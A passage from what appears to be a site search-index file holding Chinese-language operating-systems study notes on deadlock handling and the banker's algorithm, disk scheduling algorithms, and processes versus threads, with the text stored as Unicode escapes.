\u6BCF\u79CD\u7C7B\u578B\u4E00\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B",slug:"_1-\u6BCF\u79CD\u7C7B\u578B\u4E00\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B",content:`\u4E0A\u56FE\u4E3A\u8D44\u6E90\u5206\u914D\u56FE\uFF0C\u5176\u4E2D\u65B9\u6846\u8868\u793A\u8D44\u6E90\uFF0C\u5706\u5708\u8868\u793A\u8FDB\u7A0B\u3002\u8D44\u6E90\u6307\u5411\u8FDB\u7A0B\u8868\u793A\u8BE5\u8D44\u6E90\u5DF2\u7ECF\u5206\u914D\u7ED9\u8BE5\u8FDB\u7A0B\uFF0C\u8FDB\u7A0B\u6307\u5411\u8D44\u6E90\u8868\u793A\u8FDB\u7A0B\u8BF7\u6C42\u83B7\u53D6\u8BE5\u8D44\u6E90\u3002
\u56FE a \u53EF\u4EE5\u62BD\u53D6\u51FA\u73AF\uFF0C\u5982\u56FE b\uFF0C\u5B83\u6EE1\u8DB3\u4E86\u73AF\u8DEF\u7B49\u5F85\u6761\u4EF6\uFF0C\u56E0\u6B64\u4F1A\u53D1\u751F\u6B7B\u9501\u3002
\u6BCF\u79CD\u7C7B\u578B\u4E00\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B\u7B97\u6CD5\u662F\u901A\u8FC7\u68C0\u6D4B\u6709\u5411\u56FE\u662F\u5426\u5B58\u5728\u73AF\u6765\u5B9E\u73B0\uFF0C\u4ECE\u4E00\u4E2A\u8282\u70B9\u51FA\u53D1\u8FDB\u884C\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\uFF0C\u5BF9\u8BBF\u95EE\u8FC7\u7684\u8282\u70B9\u8FDB\u884C\u6807\u8BB0\uFF0C\u5982\u679C\u8BBF\u95EE\u4E86\u5DF2\u7ECF\u6807\u8BB0\u7684\u8282\u70B9\uFF0C\u5C31\u8868\u793A\u6709\u5411\u56FE\u5B58\u5728\u73AF\uFF0C\u4E5F\u5C31\u662F\u68C0\u6D4B\u5230\u6B7B\u9501\u7684\u53D1\u751F\u3002`},{header:"2. \u6BCF\u79CD\u7C7B\u578B\u591A\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B",slug:"_2-\u6BCF\u79CD\u7C7B\u578B\u591A\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B",content:`\u4E0A\u56FE\u4E2D\uFF0C\u6709\u4E09\u4E2A\u8FDB\u7A0B\u56DB\u4E2A\u8D44\u6E90\uFF0C\u6BCF\u4E2A\u6570\u636E\u4EE3\u8868\u7684\u542B\u4E49\u5982\u4E0B\uFF1A E \u5411\u91CF\uFF1A\u8D44\u6E90\u603B\u91CF
A \u5411\u91CF\uFF1A\u8D44\u6E90\u5269\u4F59\u91CF
C \u77E9\u9635\uFF1A\u6BCF\u4E2A\u8FDB\u7A0B\u6240\u62E5\u6709\u7684\u8D44\u6E90\u6570\u91CF\uFF0C\u6BCF\u4E00\u884C\u90FD\u4EE3\u8868\u4E00\u4E2A\u8FDB\u7A0B\u62E5\u6709\u8D44\u6E90\u7684\u6570\u91CF
R \u77E9\u9635\uFF1A\u6BCF\u4E2A\u8FDB\u7A0B\u8BF7\u6C42\u7684\u8D44\u6E90\u6570\u91CF \u8FDB\u7A0B P1 \u548C P2 \u6240\u8BF7\u6C42\u7684\u8D44\u6E90\u90FD\u5F97\u4E0D\u5230\u6EE1\u8DB3\uFF0C\u53EA\u6709\u8FDB\u7A0B P3 \u53EF\u4EE5\uFF0C\u8BA9 P3 \u6267\u884C\uFF0C\u4E4B\u540E\u91CA\u653E P3 \u62E5\u6709\u7684\u8D44\u6E90\uFF0C\u6B64\u65F6 A = (2 2 2 0)\u3002P2 \u53EF\u4EE5\u6267\u884C\uFF0C\u6267\u884C\u540E\u91CA\u653E P2 \u62E5\u6709\u7684\u8D44\u6E90\uFF0CA = (4 2 2 1) \u3002P1 \u4E5F\u53EF\u4EE5\u6267\u884C\u3002\u6240\u6709\u8FDB\u7A0B\u90FD\u53EF\u4EE5\u987A\u5229\u6267\u884C\uFF0C\u6CA1\u6709\u6B7B\u9501\u3002
\u7B97\u6CD5\u603B\u7ED3\u5982\u4E0B\uFF1A
\u6BCF\u4E2A\u8FDB\u7A0B\u6700\u5F00\u59CB\u65F6\u90FD\u4E0D\u88AB\u6807\u8BB0\uFF0C\u6267\u884C\u8FC7\u7A0B\u6709\u53EF\u80FD\u88AB\u6807\u8BB0\u3002\u5F53\u7B97\u6CD5\u7ED3\u675F\u65F6\uFF0C\u4EFB\u4F55\u6CA1\u6709\u88AB\u6807\u8BB0\u7684\u8FDB\u7A0B\u90FD\u662F\u6B7B\u9501\u8FDB\u7A0B\u3002 \u5BFB\u627E\u4E00\u4E2A\u6CA1\u6709\u6807\u8BB0\u7684\u8FDB\u7A0B Pi\uFF0C\u5B83\u6240\u8BF7\u6C42\u7684\u8D44\u6E90\u5C0F\u4E8E\u7B49\u4E8E A\u3002
\u5982\u679C\u627E\u5230\u4E86\u8FD9\u6837\u4E00\u4E2A\u8FDB\u7A0B\uFF0C\u90A3\u4E48\u5C06 C \u77E9\u9635\u7684\u7B2C i \u884C\u5411\u91CF\u52A0\u5230 A \u4E2D\uFF0C\u6807\u8BB0\u8BE5\u8FDB\u7A0B\uFF0C\u5E76\u8F6C\u56DE 1\u3002
\u5982\u679C\u6CA1\u6709\u8FD9\u6837\u4E00\u4E2A\u8FDB\u7A0B\uFF0C\u7B97\u6CD5\u7EC8\u6B62\u3002`},{header:"3. \u6B7B\u9501\u6062\u590D",slug:"_3-\u6B7B\u9501\u6062\u590D",content:`\u5229\u7528\u62A2\u5360\u6062\u590D
\u5229\u7528\u56DE\u6EDA\u6062\u590D
\u901A\u8FC7\u6740\u6B7B\u8FDB\u7A0B\u6062\u590D`},{header:"\u6B7B\u9501\u9884\u9632",slug:"\u6B7B\u9501\u9884\u9632",content:"\u5728\u7A0B\u5E8F\u8FD0\u884C\u4E4B\u524D\u9884\u9632\u53D1\u751F\u6B7B\u9501\u3002"},{header:"1. \u7834\u574F\u4E92\u65A5\u6761\u4EF6",slug:"_1-\u7834\u574F\u4E92\u65A5\u6761\u4EF6",content:"\u4F8B\u5982\u5047\u8131\u673A\u6253\u5370\u673A\u6280\u672F\u5141\u8BB8\u82E5\u5E72\u4E2A\u8FDB\u7A0B\u540C\u65F6\u8F93\u51FA\uFF0C\u552F\u4E00\u771F\u6B63\u8BF7\u6C42\u7269\u7406\u6253\u5370\u673A\u7684\u8FDB\u7A0B\u662F\u6253\u5370\u673A\u5B88\u62A4\u8FDB\u7A0B\u3002"},{header:"2. \u7834\u574F\u5360\u6709\u548C\u7B49\u5F85\u6761\u4EF6",slug:"_2-\u7834\u574F\u5360\u6709\u548C\u7B49\u5F85\u6761\u4EF6",content:"\u4E00\u79CD\u5B9E\u73B0\u65B9\u5F0F\u662F\u89C4\u5B9A\u6240\u6709\u8FDB\u7A0B\u5728\u5F00\u59CB\u6267\u884C\u524D\u8BF7\u6C42\u6240\u9700\u8981\u7684\u5168\u90E8\u8D44\u6E90\u3002"},{header:"3. \u7834\u574F\u4E0D\u53EF\u62A2\u5360\u6761\u4EF6",slug:"_3-\u7834\u574F\u4E0D\u53EF\u62A2\u5360\u6761\u4EF6",content:""},{header:"4. \u7834\u574F\u73AF\u8DEF\u7B49\u5F85",slug:"_4-\u7834\u574F\u73AF\u8DEF\u7B49\u5F85",content:"\u7ED9\u8D44\u6E90\u7EDF\u4E00\u7F16\u53F7\uFF0C\u8FDB\u7A0B\u53EA\u80FD\u6309\u7F16\u53F7\u987A\u5E8F\u6765\u8BF7\u6C42\u8D44\u6E90\u3002"},{header:"\u6B7B\u9501\u907F\u514D",slug:"\u6B7B\u9501\u907F\u514D",content:"\u5728\u7A0B\u5E8F\u8FD0\u884C\u65F6\u907F\u514D\u53D1\u751F\u6B7B\u9501\u3002"},{header:"1. \u5B89\u5168\u72B6\u6001",slug:"_1-\u5B89\u5168\u72B6\u6001",content:`\u56FE a \u7684\u7B2C\u4E8C\u5217 Has \u8868\u793A\u5DF2\u62E5\u6709\u7684\u8D44\u6E90\u6570\uFF0C\u7B2C\u4E09\u5217 Max \u8868\u793A\u603B\u5171\u9700\u8981\u7684\u8D44\u6E90\u6570\uFF0CFree \u8868\u793A\u8FD8\u6709\u53EF\u4EE5\u4F7F\u7528\u7684\u8D44\u6E90\u6570\u3002\u4ECE\u56FE a \u5F00\u59CB\u51FA\u53D1\uFF0C\u5148\u8BA9 B \u62E5\u6709\u6240\u9700\u7684\u6240\u6709\u8D44\u6E90\uFF08\u56FE b\uFF09\uFF0C\u8FD0\u884C\u7ED3\u675F\u540E\u91CA\u653E B\uFF0C\u6B64\u65F6 Free \u53D8\u4E3A 5\uFF08\u56FE c\uFF09\uFF1B\u63A5\u7740\u4EE5\u540C\u6837\u7684\u65B9\u5F0F\u8FD0\u884C C \u548C A\uFF0C\u4F7F\u5F97\u6240\u6709\u8FDB\u7A0B\u90FD\u80FD\u6210\u529F\u8FD0\u884C\uFF0C\u56E0\u6B64\u53EF\u4EE5\u79F0\u56FE a \u6240\u793A\u7684\u72B6\u6001\u65F6\u5B89\u5168\u7684\u3002
\u5B9A\u4E49\uFF1A\u5982\u679C\u6CA1\u6709\u6B7B\u9501\u53D1\u751F\uFF0C\u5E76\u4E14\u5373\u4F7F\u6240\u6709\u8FDB\u7A0B\u7A81\u7136\u8BF7\u6C42\u5BF9\u8D44\u6E90\u7684\u6700\u5927\u9700\u6C42\uFF0C\u4E5F\u4ECD\u7136\u5B58\u5728\u67D0\u79CD\u8C03\u5EA6\u6B21\u5E8F\u80FD\u591F\u4F7F\u5F97\u6BCF\u4E00\u4E2A\u8FDB\u7A0B\u8FD0\u884C\u5B8C\u6BD5\uFF0C\u5219\u79F0\u8BE5\u72B6\u6001\u662F\u5B89\u5168\u7684\u3002
\u5B89\u5168\u72B6\u6001\u7684\u68C0\u6D4B\u4E0E\u6B7B\u9501\u7684\u68C0\u6D4B\u7C7B\u4F3C\uFF0C\u56E0\u4E3A\u5B89\u5168\u72B6\u6001\u5FC5\u987B\u8981\u6C42\u4E0D\u80FD\u53D1\u751F\u6B7B\u9501\u3002\u4E0B\u9762\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5\u4E0E\u6B7B\u9501\u68C0\u6D4B\u7B97\u6CD5\u975E\u5E38\u7C7B\u4F3C\uFF0C\u53EF\u4EE5\u7ED3\u5408\u7740\u505A\u53C2\u8003\u5BF9\u6BD4\u3002`},{header:"2. \u5355\u4E2A\u8D44\u6E90\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5",slug:"_2-\u5355\u4E2A\u8D44\u6E90\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5",content:"\u4E00\u4E2A\u5C0F\u57CE\u9547\u7684\u94F6\u884C\u5BB6\uFF0C\u4ED6\u5411\u4E00\u7FA4\u5BA2\u6237\u5206\u522B\u627F\u8BFA\u4E86\u4E00\u5B9A\u7684\u8D37\u6B3E\u989D\u5EA6\uFF0C\u7B97\u6CD5\u8981\u505A\u7684\u662F\u5224\u65AD\u5BF9\u8BF7\u6C42\u7684\u6EE1\u8DB3\u662F\u5426\u4F1A\u8FDB\u5165\u4E0D\u5B89\u5168\u72B6\u6001\uFF0C\u5982\u679C\u662F\uFF0C\u5C31\u62D2\u7EDD\u8BF7\u6C42\uFF1B\u5426\u5219\u4E88\u4EE5\u5206\u914D\u3002 \u4E0A\u56FE c \u4E3A\u4E0D\u5B89\u5168\u72B6\u6001\uFF0C\u56E0\u6B64\u7B97\u6CD5\u4F1A\u62D2\u7EDD\u4E4B\u524D\u7684\u8BF7\u6C42\uFF0C\u4ECE\u800C\u907F\u514D\u8FDB\u5165\u56FE c \u4E2D\u7684\u72B6\u6001\u3002"},{header:"3. \u591A\u4E2A\u8D44\u6E90\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5",slug:"_3-\u591A\u4E2A\u8D44\u6E90\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5",content:`\u4E0A\u56FE\u4E2D\u6709\u4E94\u4E2A\u8FDB\u7A0B\uFF0C\u56DB\u4E2A\u8D44\u6E90\u3002\u5DE6\u8FB9\u7684\u56FE\u8868\u793A\u5DF2\u7ECF\u5206\u914D\u7684\u8D44\u6E90\uFF0C\u53F3\u8FB9\u7684\u56FE\u8868\u793A\u8FD8\u9700\u8981\u5206\u914D\u7684\u8D44\u6E90\u3002\u6700\u53F3\u8FB9\u7684 E\u3001P \u4EE5\u53CA A \u5206\u522B\u8868\u793A\uFF1A\u603B\u8D44\u6E90\u3001\u5DF2\u5206\u914D\u8D44\u6E90\u4EE5\u53CA\u53EF\u7528\u8D44\u6E90\uFF0C\u6CE8\u610F\u8FD9\u4E09\u4E2A\u4E3A\u5411\u91CF\uFF0C\u800C\u4E0D\u662F\u5177\u4F53\u6570\u503C\uFF0C\u4F8B\u5982 A=(1020)\uFF0C\u8868\u793A 4 \u4E2A\u8D44\u6E90\u5206\u522B\u8FD8\u5269\u4E0B 1/0/2/0\u3002
\u68C0\u67E5\u4E00\u4E2A\u72B6\u6001\u662F\u5426\u5B89\u5168\u7684\u7B97\u6CD5\u5982\u4E0B\uFF1A \u67E5\u627E\u53F3\u8FB9\u7684\u77E9\u9635\u662F\u5426\u5B58\u5728\u4E00\u884C\u5C0F\u4E8E\u7B49\u4E8E\u5411\u91CF A\u3002\u5982\u679C\u4E0D\u5B58\u5728\u8FD9\u6837\u7684\u884C\uFF0C\u90A3\u4E48\u7CFB\u7EDF\u5C06\u4F1A\u53D1\u751F\u6B7B\u9501\uFF0C\u72B6\u6001\u662F\u4E0D\u5B89\u5168\u7684\u3002
\u5047\u82E5\u627E\u5230\u8FD9\u6837\u4E00\u884C\uFF0C\u5C06\u8BE5\u8FDB\u7A0B\u6807\u8BB0\u4E3A\u7EC8\u6B62\uFF0C\u5E76\u5C06\u5176\u5DF2\u5206\u914D\u8D44\u6E90\u52A0\u5230 A \u4E2D\u3002
\u91CD\u590D\u4EE5\u4E0A\u4E24\u6B65\uFF0C\u76F4\u5230\u6240\u6709\u8FDB\u7A0B\u90FD\u6807\u8BB0\u4E3A\u7EC8\u6B62\uFF0C\u5219\u72B6\u6001\u65F6\u5B89\u5168\u7684\u3002 \u5982\u679C\u4E00\u4E2A\u72B6\u6001\u4E0D\u662F\u5B89\u5168\u7684\uFF0C\u9700\u8981\u62D2\u7EDD\u8FDB\u5165\u8FD9\u4E2A\u72B6\u6001\u3002`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E7%9B%AE%E5%BD%95.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF",content:`\u6982\u8FF0
\u8FDB\u7A0B\u7BA1\u7406
\u6B7B\u9501
\u5185\u5B58\u7BA1\u7406
\u8BBE\u5907\u7BA1\u7406
\u94FE\u63A5`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014.
\u6C64\u5B50\u701B, \u54F2\u51E4\u5C4F, \u6C64\u5C0F\u4E39. \u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF[M]. \u897F\u5B89\u7535\u5B50\u79D1\u6280\u5927\u5B66\u51FA\u7248\u793E, 2001.
Bryant, R. E., & O\u2019Hallaron, D. R. (2004). \u6DF1\u5165\u7406\u89E3\u8BA1\u7B97\u673A\u7CFB\u7EDF.
\u53F2\u8482\u6587\u65AF. UNIX \u73AF\u5883\u9AD8\u7EA7\u7F16\u7A0B [M]. \u4EBA\u6C11\u90AE\u7535\u51FA\u7248\u793E, 2014.
Operating System Notes
Operating-System Structures
Processes
Inter Process Communication Presentation[1]
Decoding UCS Invicta \u2013 Part 1`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u8BBE\u5907\u7BA1\u7406",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u8BBE\u5907\u7BA1\u7406",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF-\u8BBE\u5907\u7BA1\u7406",content:`\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u8BBE\u5907\u7BA1\u7406 \u78C1\u76D8\u7ED3\u6784
\u78C1\u76D8\u8C03\u5EA6\u7B97\u6CD5 1. \u5148\u6765\u5148\u670D\u52A1
2. \u6700\u77ED\u5BFB\u9053\u65F6\u95F4\u4F18\u5148
3. \u7535\u68AF\u7B97\u6CD5`},{header:"\u78C1\u76D8\u7ED3\u6784",slug:"\u78C1\u76D8\u7ED3\u6784",content:`\u76D8\u9762\uFF08Platter\uFF09\uFF1A\u4E00\u4E2A\u78C1\u76D8\u6709\u591A\u4E2A\u76D8\u9762\uFF1B
\u78C1\u9053\uFF08Track\uFF09\uFF1A\u76D8\u9762\u4E0A\u7684\u5706\u5F62\u5E26\u72B6\u533A\u57DF\uFF0C\u4E00\u4E2A\u76D8\u9762\u53EF\u4EE5\u6709\u591A\u4E2A\u78C1\u9053\uFF1B
\u6247\u533A\uFF08Track Sector\uFF09\uFF1A\u78C1\u9053\u4E0A\u7684\u4E00\u4E2A\u5F27\u6BB5\uFF0C\u4E00\u4E2A\u78C1\u9053\u53EF\u4EE5\u6709\u591A\u4E2A\u6247\u533A\uFF0C\u5B83\u662F\u6700\u5C0F\u7684\u7269\u7406\u50A8\u5B58\u5355\u4F4D\uFF0C\u76EE\u524D\u4E3B\u8981\u6709 512 bytes \u4E0E 4 K \u4E24\u79CD\u5927\u5C0F\uFF1B
\u78C1\u5934\uFF08Head\uFF09\uFF1A\u4E0E\u76D8\u9762\u975E\u5E38\u63A5\u8FD1\uFF0C\u80FD\u591F\u5C06\u76D8\u9762\u4E0A\u7684\u78C1\u573A\u8F6C\u6362\u4E3A\u7535\u4FE1\u53F7\uFF08\u8BFB\uFF09\uFF0C\u6216\u8005\u5C06\u7535\u4FE1\u53F7\u8F6C\u6362\u4E3A\u76D8\u9762\u7684\u78C1\u573A\uFF08\u5199\uFF09\uFF1B
\u5236\u52A8\u624B\u81C2\uFF08Actuator arm\uFF09\uFF1A\u7528\u4E8E\u5728\u78C1\u9053\u4E4B\u95F4\u79FB\u52A8\u78C1\u5934\uFF1B
\u4E3B\u8F74\uFF08Spindle\uFF09\uFF1A\u4F7F\u6574\u4E2A\u76D8\u9762\u8F6C\u52A8\u3002`},{header:"\u78C1\u76D8\u8C03\u5EA6\u7B97\u6CD5",slug:"\u78C1\u76D8\u8C03\u5EA6\u7B97\u6CD5",content:`\u8BFB\u5199\u4E00\u4E2A\u78C1\u76D8\u5757\u7684\u65F6\u95F4\u7684\u5F71\u54CD\u56E0\u7D20\u6709\uFF1A \u65CB\u8F6C\u65F6\u95F4\uFF08\u4E3B\u8F74\u8F6C\u52A8\u76D8\u9762\uFF0C\u4F7F\u5F97\u78C1\u5934\u79FB\u52A8\u5230\u9002\u5F53\u7684\u6247\u533A\u4E0A\uFF09
\u5BFB\u9053\u65F6\u95F4\uFF08\u5236\u52A8\u624B\u81C2\u79FB\u52A8\uFF0C\u4F7F\u5F97\u78C1\u5934\u79FB\u52A8\u5230\u9002\u5F53\u7684\u78C1\u9053\u4E0A\uFF09
\u5B9E\u9645\u7684\u6570\u636E\u4F20\u8F93\u65F6\u95F4 \u5176\u4E2D\uFF0C\u5BFB\u9053\u65F6\u95F4\u6700\u957F\uFF0C\u56E0\u6B64\u78C1\u76D8\u8C03\u5EA6\u7684\u4E3B\u8981\u76EE\u6807\u662F\u4F7F\u78C1\u76D8\u7684\u5E73\u5747\u5BFB\u9053\u65F6\u95F4\u6700\u77ED\u3002`},{header:"1. \u5148\u6765\u5148\u670D\u52A1",slug:"_1-\u5148\u6765\u5148\u670D\u52A1",content:`FCFS, First Come First Served \u6309\u7167\u78C1\u76D8\u8BF7\u6C42\u7684\u987A\u5E8F\u8FDB\u884C\u8C03\u5EA6\u3002
\u4F18\u70B9\u662F\u516C\u5E73\u548C\u7B80\u5355\u3002\u7F3A\u70B9\u4E5F\u5F88\u660E\u663E\uFF0C\u56E0\u4E3A\u672A\u5BF9\u5BFB\u9053\u505A\u4EFB\u4F55\u4F18\u5316\uFF0C\u4F7F\u5E73\u5747\u5BFB\u9053\u65F6\u95F4\u53EF\u80FD\u8F83\u957F\u3002`},{header:"2. \u6700\u77ED\u5BFB\u9053\u65F6\u95F4\u4F18\u5148",slug:"_2-\u6700\u77ED\u5BFB\u9053\u65F6\u95F4\u4F18\u5148",content:`SSTF, Shortest Seek Time First \u4F18\u5148\u8C03\u5EA6\u4E0E\u5F53\u524D\u78C1\u5934\u6240\u5728\u78C1\u9053\u8DDD\u79BB\u6700\u8FD1\u7684\u78C1\u9053\u3002
\u867D\u7136\u5E73\u5747\u5BFB\u9053\u65F6\u95F4\u6BD4\u8F83\u4F4E\uFF0C\u4F46\u662F\u4E0D\u591F\u516C\u5E73\u3002\u5982\u679C\u65B0\u5230\u8FBE\u7684\u78C1\u9053\u8BF7\u6C42\u603B\u662F\u6BD4\u4E00\u4E2A\u5728\u7B49\u5F85\u7684\u78C1\u9053\u8BF7\u6C42\u8FD1\uFF0C\u90A3\u4E48\u5728\u7B49\u5F85\u7684\u78C1\u9053\u8BF7\u6C42\u4F1A\u4E00\u76F4\u7B49\u5F85\u4E0B\u53BB\uFF0C\u4E5F\u5C31\u662F\u51FA\u73B0\u9965\u997F\u73B0\u8C61\u3002\u5177\u4F53\u6765\u8BF4\uFF0C\u4E24\u7AEF\u7684\u78C1\u9053\u8BF7\u6C42\u66F4\u5BB9\u6613\u51FA\u73B0\u9965\u997F\u73B0\u8C61\u3002`},{header:"3. \u7535\u68AF\u7B97\u6CD5",slug:"_3-\u7535\u68AF\u7B97\u6CD5",content:`SCAN \u7535\u68AF\u603B\u662F\u4FDD\u6301\u4E00\u4E2A\u65B9\u5411\u8FD0\u884C\uFF0C\u76F4\u5230\u8BE5\u65B9\u5411\u6CA1\u6709\u8BF7\u6C42\u4E3A\u6B62\uFF0C\u7136\u540E\u6539\u53D8\u8FD0\u884C\u65B9\u5411\u3002
\u7535\u68AF\u7B97\u6CD5\uFF08\u626B\u63CF\u7B97\u6CD5\uFF09\u548C\u7535\u68AF\u7684\u8FD0\u884C\u8FC7\u7A0B\u7C7B\u4F3C\uFF0C\u603B\u662F\u6309\u4E00\u4E2A\u65B9\u5411\u6765\u8FDB\u884C\u78C1\u76D8\u8C03\u5EA6\uFF0C\u76F4\u5230\u8BE5\u65B9\u5411\u4E0A\u6CA1\u6709\u672A\u5B8C\u6210\u7684\u78C1\u76D8\u8BF7\u6C42\uFF0C\u7136\u540E\u6539\u53D8\u65B9\u5411\u3002
\u56E0\u4E3A\u8003\u8651\u4E86\u79FB\u52A8\u65B9\u5411\uFF0C\u56E0\u6B64\u6240\u6709\u7684\u78C1\u76D8\u8BF7\u6C42\u90FD\u4F1A\u88AB\u6EE1\u8DB3\uFF0C\u89E3\u51B3\u4E86 SSTF \u7684\u9965\u997F\u95EE\u9898\u3002`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u8FDB\u7A0B\u7BA1\u7406",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u8FDB\u7A0B\u7BA1\u7406",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF-\u8FDB\u7A0B\u7BA1\u7406",content:`\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u8FDB\u7A0B\u7BA1\u7406 \u8FDB\u7A0B\u4E0E\u7EBF\u7A0B 1. \u8FDB\u7A0B
2. \u7EBF\u7A0B
3. \u533A\u522B \u8FDB\u7A0B\u72B6\u6001\u7684\u5207\u6362
\u8FDB\u7A0B\u8C03\u5EA6\u7B97\u6CD5 1. \u6279\u5904\u7406\u7CFB\u7EDF
2. \u4EA4\u4E92\u5F0F\u7CFB\u7EDF
3. \u5B9E\u65F6\u7CFB\u7EDF \u8FDB\u7A0B\u540C\u6B65 1. \u4E34\u754C\u533A
2. \u540C\u6B65\u4E0E\u4E92\u65A5
3. \u4FE1\u53F7\u91CF
4. \u7BA1\u7A0B \u7ECF\u5178\u540C\u6B65\u95EE\u9898 1. \u54F2\u5B66\u5BB6\u8FDB\u9910\u95EE\u9898
2. \u8BFB\u8005-\u5199\u8005\u95EE\u9898 \u8FDB\u7A0B\u901A\u4FE1 1. \u7BA1\u9053
2. FIFO
3. \u6D88\u606F\u961F\u5217
4. \u4FE1\u53F7\u91CF
5. \u5171\u4EAB\u5B58\u50A8
6. \u5957\u63A5\u5B57`},{header:"\u8FDB\u7A0B\u4E0E\u7EBF\u7A0B",slug:"\u8FDB\u7A0B\u4E0E\u7EBF\u7A0B",content:""},{header:"1. \u8FDB\u7A0B",slug:"_1-\u8FDB\u7A0B",content:`\u8FDB\u7A0B\u662F\u8D44\u6E90\u5206\u914D\u7684\u57FA\u672C\u5355\u4F4D\u3002
\u8FDB\u7A0B\u63A7\u5236\u5757 (Process Control Block, PCB) \u63CF\u8FF0\u8FDB\u7A0B\u7684\u57FA\u672C\u4FE1\u606F\u548C\u8FD0\u884C\u72B6\u6001\uFF0C\u6240\u8C13\u7684\u521B\u5EFA\u8FDB\u7A0B\u548C\u64A4\u9500\u8FDB\u7A0B\uFF0C\u90FD\u662F\u6307\u5BF9 PCB \u7684\u64CD\u4F5C\u3002
\u4E0B\u56FE\u663E\u793A\u4E86 4 \u4E2A\u7A0B\u5E8F\u521B\u5EFA\u4E86 4 \u4E2A\u8FDB\u7A0B\uFF0C\u8FD9 4 \u4E2A\u8FDB\u7A0B\u53EF\u4EE5\u5E76\u53D1\u5730\u6267\u884C\u3002`},{header:"2. \u7EBF\u7A0B",slug:"_2-\u7EBF\u7A0B",content:`\u7EBF\u7A0B\u662F\u72EC\u7ACB\u8C03\u5EA6\u7684\u57FA\u672C\u5355\u4F4D\u3002
\u4E00\u4E2A\u8FDB\u7A0B\u4E2D\u53EF\u4EE5\u6709\u591A\u4E2A\u7EBF\u7A0B\uFF0C\u5B83\u4EEC\u5171\u4EAB\u8FDB\u7A0B\u8D44\u6E90\u3002
QQ \u548C\u6D4F\u89C8\u5668\u662F\u4E24\u4E2A\u8FDB\u7A0B\uFF0C\u6D4F\u89C8\u5668\u8FDB\u7A0B\u91CC\u9762\u6709\u5F88\u591A\u7EBF\u7A0B\uFF0C\u4F8B\u5982 HTTP \u8BF7\u6C42\u7EBF\u7A0B\u3001\u4E8B\u4EF6\u54CD\u5E94\u7EBF\u7A0B\u3001\u6E32\u67D3\u7EBF\u7A0B\u7B49\u7B49\uFF0C\u7EBF\u7A0B\u7684\u5E76\u53D1\u6267\u884C\u4F7F\u5F97\u5728\u6D4F\u89C8\u5668\u4E2D\u70B9\u51FB\u4E00\u4E2A\u65B0\u94FE\u63A5\u4ECE\u800C\u53D1\u8D77 HTTP \u8BF7\u6C42\u65F6\uFF0C\u6D4F\u89C8\u5668\u8FD8\u53EF\u4EE5\u54CD\u5E94\u7528\u6237\u7684\u5176\u5B83\u4E8B\u4EF6\u3002`},{header:"3. \u533A\u522B",slug:"_3-\u533A\u522B",content:`\u2160 \u62E5\u6709\u8D44\u6E90
\u8FDB\u7A0B\u662F\u8D44\u6E90\u5206\u914D\u7684\u57FA\u672C\u5355\u4F4D\uFF0C\u4F46\u662F\u7EBF\u7A0B\u4E0D\u62E5\u6709\u8D44\u6E90\uFF0C\u7EBF\u7A0B\u53EF\u4EE5\u8BBF\u95EE\u96B6\u5C5E\u8FDB\u7A0B\u7684\u8D44\u6E90\u3002
\u2161 \u8C03\u5EA6
\u7EBF\u7A0B\u662F\u72EC\u7ACB\u8C03\u5EA6\u7684\u57FA\u672C\u5355\u4F4D\uFF0C\u5728\u540C\u4E00\u8FDB\u7A0B\u4E2D\uFF0C\u7EBF\u7A0B\u7684\u5207\u6362\u4E0D\u4F1A\u5F15\u8D77\u8FDB\u7A0B\u5207\u6362\uFF0C\u4ECE\u4E00\u4E2A\u8FDB\u7A0B\u4E2D\u7684\u7EBF\u7A0B\u5207\u6362\u5230\u53E6\u4E00\u4E2A\u8FDB\u7A0B\u4E2D\u7684\u7EBF\u7A0B\u65F6\uFF0C\u4F1A\u5F15\u8D77\u8FDB\u7A0B\u5207\u6362\u3002
\u2162 \u7CFB\u7EDF\u5F00\u9500
